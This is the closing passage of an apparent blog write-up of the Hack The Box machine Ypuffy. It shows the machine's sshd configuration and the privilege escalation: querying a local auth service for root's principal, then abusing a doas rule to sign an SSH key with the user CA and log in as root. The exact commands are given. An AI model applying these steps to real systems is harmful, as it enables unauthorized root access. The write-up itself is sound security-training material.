6</span><br><span class="line">#MaxSessions 10</span><br><span class="line"></span><br><span class="line">#PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line"># The default is to check both .ssh&#x2F;authorized_keys and .ssh&#x2F;authorized_keys2</span><br><span class="line"># but this is overridden so installations will only check .ssh&#x2F;authorized_keys</span><br><span class="line">AuthorizedKeysFile	.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"></span><br><span class="line">AuthorizedKeysCommand &#x2F;usr&#x2F;local&#x2F;bin&#x2F;curl http:&#x2F;&#x2F;127.0.0.1&#x2F;sshauth?type&#x3D;keys&amp;username&#x3D;%u</span><br><span class="line">AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line">TrustedUserCAKeys &#x2F;home&#x2F;userca&#x2F;ca.pub</span><br><span class="line">AuthorizedPrincipalsCommand &#x2F;usr&#x2F;local&#x2F;bin&#x2F;curl http:&#x2F;&#x2F;127.0.0.1&#x2F;sshauth?type&#x3D;principals&amp;username&#x3D;%u</span><br><span class="line">AuthorizedPrincipalsCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in &#x2F;etc&#x2F;ssh&#x2F;ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&#39;t trust ~&#x2F;.ssh&#x2F;known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&#39;t read the user&#39;s ~&#x2F;.rhosts and ~&#x2F;.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">PasswordAuthentication no</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"># Change to no to disable s&#x2F;key passwords</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line">AllowAgentForwarding no</span><br><span class="line">AllowTcpForwarding no</span><br><span class="line">#GatewayPorts no</span><br><span class="line">X11Forwarding no</span><br><span class="line">#X11DisplayOffset 10</span><br><span class="line">#X11UseLocalhost yes</span><br><span class="line">#PermitTTY yes</span><br><span class="line">#PrintMotd yes</span><br><span class="line">#PrintLastLog yes</span><br><span class="line">#TCPKeepAlive yes</span><br><span class="line">#UseLogin no</span><br><span class="line">#PermitUserEnvironment no</span><br><span class="line">#Compression delayed</span><br><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br><span class="line">#UseDNS no</span><br><span class="line">#PidFile &#x2F;var&#x2F;run&#x2F;sshd.pid</span><br><span class="line">#MaxStartups 10:30:100</span><br><span class="line">#PermitTunnel no</span><br><span class="line">#ChrootDirectory none</span><br><span class="line">#VersionAddendum none</span><br><span class="line"></span><br><span class="line"># no default banner path</span><br><span class="line">#Banner none</span><br><span class="line"></span><br><span class="line"># override default of no subsystems</span><br><span class="line">Subsystem	sftp	&#x2F;usr&#x2F;libexec&#x2F;sftp-server</span><br><span class="line"></span><br><span class="line"># Example of overriding settings on a per-user basis</span><br><span class="line">#Match User anoncvs</span><br><span class="line">#	X11Forwarding no</span><br><span class="line">#	AllowTcpForwarding no</span><br><span class="line">#	PermitTTY no</span><br><span class="line">#	ForceCommand cvs server</span><br></pre></td></tr></table></figure>
<p>This part :<br><img src="/images/hackthebox/ypuffy/15.png" alt=""><br>So that http service is responsible for some ssh authentication stuff , and we can request keys from <code>/sshauth?type=keys&amp;username=</code> and principals from <code>/sshauth?type=principals&amp;username=</code> , requesting keys for root gives us no response , but requesting the principal we get <code>3m3rgencyB4ckd00r</code><br><img src="/images/hackthebox/ypuffy/16.png" alt=""></p>
<h2 id="Generating-and-signing-ssh-keys-Getting-root"><a href="#Generating-and-signing-ssh-keys-Getting-root" class="headerlink" title="Generating and signing ssh keys , Getting root"></a>Generating and signing ssh keys , Getting root</h2><p>So now we have root’s principal <code>3m3rgencyB4ckd00r</code>. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.<br>The problem is , as <code>alice1978</code> we are not authorized to do this. On linux we could check if we can run elevated commands with <code>sudo -l</code> but here there’s no sudo , instead of that there’s a command called <code>doas</code> , if we check the config file for it :<br><img src="/images/hackthebox/ypuffy/17.png" alt=""><br>We can run <code>ssh-keygen</code> as <code>userca</code> without password.<br>First step is to create ssh keys for <code>alice1978</code><br><code>ssh-keygen -t rsa -f /tmp/id_rsa</code><br><img src="/images/hackthebox/ypuffy/18.png" alt=""><br>Then we need the certificate (<code>ca</code>) in <code>/home/userca/</code> so we will cd there<br><img src="/images/hackthebox/ypuffy/19.png" alt=""><br>And sign the ssh keys we have just created as root<br><code>doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa</code></p>
<p><code>doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub</code><br><img src="/images/hackthebox/ypuffy/20.png" alt=""><br><code>-s</code> for certificate , <code>-I</code> for identity and <code>-n</code> for principal<br>Finally we will ssh as root :<br><code>ssh -i /tmp/id_rsa root@localhost</code><br><img src="/images/hackthebox/ypuffy/21.png" alt=""><br>And we owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/dab/">Hack The Box - Dab</a><br>Next Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-02-09</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/bsd/" rel="tag">#bsd</a> <a class="tag-link" href="/tags/ldap/" rel="tag">#ldap</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
